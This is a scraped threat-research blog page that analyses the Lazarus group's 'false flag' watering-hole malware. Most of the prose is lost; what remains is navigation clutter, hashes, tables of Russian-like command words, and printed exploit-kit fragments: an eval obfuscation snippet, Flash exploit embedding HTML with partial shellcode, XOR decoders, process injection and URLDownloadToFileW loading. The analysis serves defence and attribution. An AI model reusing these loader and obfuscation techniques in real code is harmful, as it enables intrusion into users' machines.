
Resources
Contact us

Resources
Contact us


BAE Systems Threat Research Blog




Pages


Home


Products


Solutions


News & Events


Partners


About Us


Careers



Home


Products


Solutions


News & Events


Partners


About Us


Careers

Blog Archive





        ▼ 
      



2017

(5)





        ► 
      



October

(1)







        ► 
      



May

(1)







        ► 
      



April

(1)







        ▼ 
      



February

(2)

Lazarus’ False Flag Malware
Lazarus & Watering-hole attacks









        ▼ 
      



2017

(5)





        ► 
      



October

(1)







        ► 
      



May

(1)







        ► 
      



April

(1)







        ▼ 
      



February

(2)

Lazarus’ False Flag Malware
Lazarus & Watering-hole attacks









        ► 
      



October

(1)






        ► 
      



October

(1)






        ► 
      



May

(1)






        ► 
      



May

(1)






        ► 
      



April

(1)






        ► 
      



April

(1)






        ▼ 
      



February

(2)

Lazarus’ False Flag Malware
Lazarus & Watering-hole attacks







        ▼ 
      



February

(2)

Lazarus’ False Flag Malware
Lazarus & Watering-hole attacks



Lazarus’ False Flag Malware
Lazarus & Watering-hole attacks

Lazarus’ False Flag Malware
Lazarus & Watering-hole attacks





        ► 
      



2016

(4)





        ► 
      



May

(1)







        ► 
      



April

(2)







        ► 
      



January

(1)








        ► 
      



2016

(4)





        ► 
      



May

(1)







        ► 
      



April

(2)







        ► 
      



January

(1)








        ► 
      



May

(1)






        ► 
      



May

(1)






        ► 
      



April

(2)






        ► 
      



April

(2)






        ► 
      



January

(1)






        ► 
      



January

(1)






        ► 
      



2015

(3)





        ► 
      



December

(1)







        ► 
      



November

(1)







        ► 
      



June

(1)








        ► 
      



2015

(3)





        ► 
      



December

(1)







        ► 
      



November

(1)







        ► 
      



June

(1)








        ► 
      



December

(1)






        ► 
      



December

(1)






        ► 
      



November

(1)






        ► 
      



November

(1)






        ► 
      



June

(1)






        ► 
      



June

(1)






        ► 
      



2013

(3)





        ► 
      



November

(3)








        ► 
      



2013

(3)





        ► 
      



November

(3)








        ► 
      



November

(3)






        ► 
      



November

(3)

Search












Flickr
Labels


Threat Research



Threat Research


Lazarus’ False Flag Malware




MD5 hash
        
Filename
        
Compile Time
        
File Info
        
Submitted
        


9216b29114fb6713ef228370cbfe4045
        
srservice.chm
        
N/A
 
N/A
        
N/A
        


8e32fccd70cec634d13795bcb1da85ff
        
srservice.hlp
        
N/A
 
N/A
        
N/A
        


e29fe3c181ac9ddbb242688b151f3310
        
srservice.dll
        
2016-10-22
08:08
 
Win64 DLL
78 KB
        
2017-01-28
11:58
        


9914075cc687bdc352ee136ac6579707
        
fdsvc.exe
        
2016-08-26
04:19
 
Win64 EXE
60 KB
        
2017-02-05
15:14
        


9cc6854bc5e217104734043c89dc4ff8
        
fdsvc.dll
        
2016-08-26
04:11
 
Encrypted
470 KB
        
2017-02-05
15:15
        






MD5 hash
        
Filename
        
File Info
        
Submitted
        


6dffcfa68433f886b2e88fd984b4995a
        
cambio.swf
        
Adobe Flash
        
2016-12-07 23:15
        





Word
State/Backdoor Command


"Nachalo"
start communication session


"ustanavlivat"
handshake state


"poluchit"
receive data


"pereslat"
send data


"derzhat"
maintain communication session


"vykhodit"
exit communication session




Word
Type of error
Correct analogue


"ustanavlivat"
omitted sign at the end, verb tense error
"ustanovit'" or "ustanoviti"


"poluchit"
omitted sign at the end
"poluchit'" or "poluchiti"


"pereslat"
omitted sign at the end
"pereslat'" or "pereslati"


"derzhat"
omitted sign at the end
"derzhat'" or "derzhati"


"vykhodit"
omitted sign at the end, verb tense error
"vyiti"



  •  genExp_20160034() – to generate Silverlight exploit
  •  genExp_00000001() – to generate Flash exploit

  •  genExp_20160034() – to generate Silverlight exploit
  •  genExp_00000001() – to generate Flash exploit


01

String PARAMNAME_UID = "uid";



02

String PARAMNAME_PAGENUM = "pagenum";



03

String PARAMNAME_EXPLOITID = "eid";



04

String PARAMNAME_STATUS = "s";



05

String PARAMNAME_DATA = "data";



06

 



07

download_url = request.getRequestURL() + 



08

"?" + PARAMNAME_UID + "=" + uid +



09

"&" + PARAMNAME_PAGENUM + "=3" +



10

"&" + PARAMNAME_EXPLOITID +



11

"=" + exploit.get("eid");



12

...



13

download_url = download_url + 



14

"&" + PARAMNAME_STATUS + "=2" +



15

"&" + PARAMNAME_DATA + "=";





01

var laskfji = 'PGh0bWw+..'; // long string here



02

asdlfkj = function(s) {



03

// base64-decode string s



04

};



05

var polkio = asdlfkj(laskfji);



06

var poikea = 'document.write(polkio);';



07

eval(poikea);





01

<html>



02

<body>



03

<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000"



04

codebase="http://download.macromedia.com/.../swflash.cab"



05

width="1"



06

height="1" >



07

<param name="movie" value="include/cambio.swf" />



08

<param name="allowScriptAccess" value="always" />



09

<param name="FlashVars"



10

value="shell=558BEC83...00&Health=polki89jdm#ks@" />



11

<param name="Play" value="true" />



12

<embed type="application/x-shockwave-flash"



13

width="1"



14

height="1"



15

src="include/cambio.swf"



16

allowScriptAccess="always"



17

FlashVars="shell=558BEC83...00&Health=polki89jdm#ks@"



18

Play="true"/>



19

</object>



20

</body>



21

</html>





SWF Parameter
Value


"shell"
558BEC83EC388D45C8C745F...


"Health"
polki89jdm#ks@




01

objLoader = new Loader();



02

this.params = loaderInfo.parameters;



03

...



04

var key:String = params["Health"] as String;



05

var pShell:String = params["shell"] as String;



06

var objShellData:SharedObject = SharedObject.getLocal("Exp_Data");



07

objShellData.clear();



08

objShellData.data.shell = pShell;



09

objShellData.flush();



10

var blob:ByteArray = new orinBin() as ByteArray;



11

var i:int = 0;



12

while(i < blob.length)



13

{



14

blob[i] = blob[i] ^ key.charCodeAt(i % key.length);



15

i++;



16

}



17

blob.position = 0;



18

objLoader.contentLoaderInfo.addEventListener("complete",fncomp);



19

objLoader.loadBytes(blob);





Transliterated Russian words used in AS
Translated from Russian


Podgotovkaskotiny
Preparation of farm animals


geigeigei3raza
Hey, hey, hey 3 times


chainik
Dummy (a stupid person)


chainikaddress
Dummy's address


poishemdatu
Let’s search for data


poiskvpro
Searching in 'pro'


vyzov_chainika
Calling the dummy (a stupid person)


daiadreschainika
Get address of the dummy


runskotina
Execute farm animals


babaLEna
Old woman Lena




01

private function put_dummy_args(param1:*) : *



02

{



03

return chainik.call.apply(null,param1);



04

}



05

private function vyzov_chainika() : *



06

{



07

return chainik.call(null);



08

}




  •  The first part of the shellcode (818 bytes) creates a hidden process of notepad.exe. It then injects the second part of the shellcode into it using the VirtualAlloc() and WriteProcessMemory() APIs, and finally it runs the injected code with CreateRemoteThread() API.

  •  The second part of the shellcode (1,551 bytes) is encoded with XOR 0x57:

  •  The first part of the shellcode (818 bytes) creates a hidden process of notepad.exe. It then injects the second part of the shellcode into it using the VirtualAlloc() and WriteProcessMemory() APIs, and finally it runs the injected code with CreateRemoteThread() API.
  •  The second part of the shellcode (1,551 bytes) is encoded with XOR 0x57:


seg000:00000316

mov    ecx, 1551   ; counter



seg000:0000031B

mov    ebx, 57h    ; XOR key



seg000:00000320

loop:



seg000:00000320

xor    [eax], ebx



seg000:00000322

dec    ecx         ; decrement counter



seg000:00000323

inc    eax         ; advance pointer



seg000:00000324

test   ecx, ecx



seg000:00000326

jnz    short loop





01

urlmon_dll = 'mlrU';            // Urlm



02

urlmon_dll_4 = 'd.no';          // on.d



03

urlmon_dll_8 = 'll';            // ll



04

URLDownloadToFileW = 'DLRU';    // URLD



05

URLDownloadToFileW_4 = 'lnwo';  // ownl



06

URLDownloadToFileW_8 = 'Tdao';  // oadT



07

URLDownloadToFileW_12 = 'liFo'; // oFile



08

URLDownloadToFileW_16 = 'We';   // eW



09

hLib = LoadLibrary(&urlmon.dll);



10

ptr[8] = (*(int)ptr[4])(hLib,   // ptr[4]->GetProcAddress



11

                        &URLDownloadToFileW);





01

for (i = 317; i < file_size; ++i )



02

{



03

buffer[i] ^= 0xCC ^ ((buffer[i] ^ 0xCC) >> 4);



04

}





01

(*(void)(ptr[68]))(buffer + 318,      // ptr[68]->VirtualProtect



02

                   file_size - 318,   // skip the first 318 bytes



03

                   PAGE_EXECUTE_READWRITE,



04

                   &oldProtect);                         



05

((void (*)(void))(buffer + 318))();   // CALL from the 318th byte





01

for (int i = 0; i < len + 9; i++)



02

{



03

byte var = b[i];



04

byte temp = (byte)((var >> 4) & 0x0F);



05

var = (byte)(var ^ temp);



06

var = (byte)(var ^ 0xCC);



07

b[i] = var;



08

}




  •  files/mark180789172360.ico, not encoded (318 bytes)
  •  files/back283671047171.dat, encoded
  •  download URL, encoded

  •  files/mark180789172360.ico, not encoded (318 bytes)
  •  files/back283671047171.dat, encoded
  •  download URL, encoded



MD5 Hashes
9cc6854bc5e217104734043c89dc4ff8



9914075cc687bdc352ee136ac6579707



e29fe3c181ac9ddbb242688b151f3310



9216b29114fb6713ef228370cbfe4045



8e32fccd70cec634d13795bcb1da85ff



889e320cf66520485e1a0475107d7419



6dffcfa68433f886b2e88fd984b4995a


Filenames
cambio.swf



cambio.xap



mark180789172360.ico



meml102783047891.dat



back283671047171.dat


URLs
view.jsp?pagenum=1



view.jsp?uid=



No comments:


Post a Comment



SUBSCRIBE
Sign up to receive our regular Cyber Threat Bulletin.
Popular Posts








Two bytes to $951m










WanaCrypt0r Ransomworm










Cyber Heist Attribution











Two bytes to $951m










WanaCrypt0r Ransomworm










Cyber Heist Attribution



Contact
For further information or to talk to an expert, please contact us.

































Accessibility
Terms & conditions
Privacy
Sitemap

Accessibility
Terms & conditions
Privacy
Sitemap
© 2015 BAE Systems. All rights reserved
